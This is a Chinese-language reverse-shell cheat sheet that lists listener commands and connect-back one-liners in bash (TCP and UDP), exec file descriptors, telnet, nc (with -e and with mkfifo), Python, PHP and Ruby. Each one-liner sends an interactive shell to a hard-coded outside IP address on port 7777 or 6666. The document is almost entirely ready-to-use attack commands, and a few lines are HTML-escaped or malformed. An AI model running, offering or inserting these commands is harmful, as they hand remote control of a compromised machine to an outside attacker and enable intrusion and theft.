Bash反弹

方法一

监听的vps使用命令：
Default
nc -nlvp 7777

被控机器使用命令：
Default
命令1：bash -i >& /dev/tcp/103.234.72.5/7777 0>&1
命令2：bash -c 'exec bash -i &>/dev/tcp/103.234.72.5/7777 <&1'

    #bash ‐i 打开一个交互的bash
    # >& 将标准错误输出重定向到标准输出
    #/dev/tcp/x.x.x.x/port 意为调用socket,建立socket连接,其中x.x.x.x为 要反弹到的主机ip，port为端口
    # 0>&1 标准输入重定向到标准输出，实现你与反弹出来的shell的交互

方法二

 在使用这个进行shell反弹时，不能使用python获取一个标准的shell，需要使用 nc再次反弹之后，使用python获取标准化输出。
Default
nc -nlvp 7777

被控机器使用命令：
Default
exec 5<>/dev/tcp/103.234.72.5/7777;cat <&5 | while read line; do $line 2>&5 >&5; done

方法三
Default
exec 0&0 2>&0 0<&196;exec 196<>/dev/tcp/103.234.72.5/7777; sh <&196 >&196 2>&196
 
 
/bin/bash -i > /dev/tcp/103.234.72.5/6666 0<&1 2>&1

方法四
Default
0<&196;exec 196<>/dev/tcp/103.234.72.5/7777; sh <&196 >&196 2>&196

bash UDP 反弹
Default
nc -u -nlvp 7777
sh -i >& /dev/udp/103.234.72.5/7777 0>&1

telnet反弹

方法一
Default
nc -nlvp 6666
nc -nlvp 7777
telnet 103.234.72.5 6666 | /bin/bash | telnet 103.234.72.5 7777
6666输入命令7777输出结果

方法二
Default
mknod a p; telnet 103.234.72.5 7777 0<a | /bin/bash 1>a(不好用)

nc反弹
Default
nc ‐e /bin/bash 103.234.72.5 7777

如果目标主机linux发行版本没有 -e 参数，还有以下方式：
Default
rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 103.234.72.5 7777 >/tmp/f

exec 反弹
Default
0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/103.234.72.5/7777; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196

python反弹
Default
export RHOST="103.234.72.5";export RPORT=7777;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

PHP反弹
Default
php -r '$sock=fsockopen("103.234.72.5",7777);exec("/bin/sh -i <&3 >&3 2>&3");'

ruby 反弹
Default
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("103.234.72.5","7777");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
